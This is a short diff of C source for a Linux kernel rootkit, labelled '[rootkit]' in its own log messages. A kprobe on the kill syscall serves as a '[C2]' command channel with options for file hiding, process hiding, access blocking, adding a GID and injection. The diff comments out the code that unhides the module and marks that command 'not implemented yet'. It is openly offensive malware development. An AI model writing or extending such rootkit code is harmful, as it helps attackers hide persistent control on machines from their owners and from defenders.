@@ -29,8 +29,10 @@
 extern int  blocking_init(void);
 extern void blocking_exit(void);
 extern bool blocking_active;
+/*
 extern void hide_module(void);
 extern void show_module(void);
+*/
 
 /* Deferred injection (can't call vm_mmap from kprobe context) */
 
@@ -118,10 +120,12 @@ static void toggle_work_fn(struct work_struct *w)
 			pr_info("[rootkit] process hiding ON\n");
 		}
 		break;
+  /*
 	case CMD_TOGGLE_MODULE:
 		show_module();
 		pr_info("[rootkit] module unhidden\n");
 		break;
+  */
 	}
 	kfree(tw);
 }
@@ -154,10 +158,6 @@ static void schedule_spawn(void)
   schedule_work(w);
 }
 
-/* Print usage helper */
-void print_usage() {
-
-}
 
 /* kprobe kill pre_handler */
 static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
@@ -216,7 +216,7 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
       pr_info("[C2]   0 - status\n");
       pr_info("[C2]   1 - file hiding\n");
       pr_info("[C2]   2 - access blocking\n");
-      pr_info("[C2]   3 - unhide module\n");
+      pr_info("[C2]   3 - unhide module (not implemented yet)\n");
       pr_info("[C2]   4 - proc hiding\n");
       pr_info("[C2]   5 - add GID\n");
       pr_info("[C2]   6 - inject\n");
